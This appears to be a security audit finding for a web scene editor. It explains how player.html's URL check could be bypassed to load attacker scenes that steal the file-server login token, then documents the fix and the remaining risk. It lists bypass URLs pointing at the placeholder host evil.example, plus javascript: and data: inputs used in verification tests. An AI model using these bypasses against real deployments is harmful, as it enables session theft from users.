# Remote scene trust (audit finding S4)

## Correction to the audit

The initial audit (`docs/audit/ASSESSMENT.md`, branch `audit/initial-assessment`) blamed `index.html?scene=<url>` in `editor/js/modules/sceneStorage.js`.
**That code is commented out upstream** (marked `/* UNSAFE */`), so the editor doesn't load scenes from the URL.
The editor's *Scene → Load from URL* dialog is started by the user and already warns about untrusted sources.
`mobile.html` only loads the logged-in user's own scene list.

The exploitable path was **`editor/player.html?url=`**.

## The vulnerability

Scenes can contain code (Script components, external/global scripts, graphs) that runs inside the page.
`player.html` is served from the same origin as the editor, and LiteFileServer keeps the login token in that origin's `localStorage`.
If an attacker's scene runs there, it can steal the user's file-server session.

The old check had two bypasses:

```js
else if( allow_remote_scenes || (url && url.indexOf("://") == -1) ) //for safety measures
	player.loadScene( url );
```

1. **Protocol-relative URLs:** `player.html?url=//evil.example/scene.json` doesn't contain `://`, but the browser fetches it from `evil.example`.
2. **External file server configured:** once a user set `Drive.fileserver_files_url` in the editor, `allow_remote_scenes` became `true`, and scenes from **any** host were accepted.

Both were reproduced in a browser against the old file: a request went out to the foreign host.

## The fix

`player.html` now resolves the URL the way the browser does (`new URL(url, location.href)`). It loads the scene only if:
- the protocol is `http:` or `https:`, and
- the origin is **this page's origin**, or **the origin of the user's configured file server**.

Otherwise it doesn't fetch anything and shows a message. The URL is inserted with `textContent`, so it's never parsed as HTML.
Reading `wgl_user_preferences` is now wrapped in try/catch, so corrupt preferences no longer break the player.

### Verified in the browser

| `?url=` | Result |
|---|---|
| `//evil.example/scene.json` | blocked, no request |
| `https://evil.example/scene.json` | blocked, no request |
| `/\evil.example/scene.json` | blocked, no request |
| `data:application/json,{}` | blocked |
| `javascript:alert(1)` | blocked |
| relative same-origin scene | loads |
| absolute same-origin scene | loads |
| configured file-server URL | loads |
| other host while a file server is configured | blocked (old code: fetched) |

## Remaining risk (not fixed here)

LiteFileSystem is **multi-user**, and user files are served from the **same origin** as the editor.
A scene uploaded by user A and opened by user B in `player.html` is "same origin", so it still runs with B's session.
A proper fix is architectural:

- serve user files and `player.html` from a **separate origin** (e.g. `files.example.com`) that has no editor session, or
- run untrusted scenes in a sandboxed `<iframe sandbox="allow-scripts">` without `allow-same-origin`, or
- move the session token out of `localStorage` into an `HttpOnly` cookie (this needs LiteFileSystem changes).

This needs a deployment decision, so it's left for a later branch.
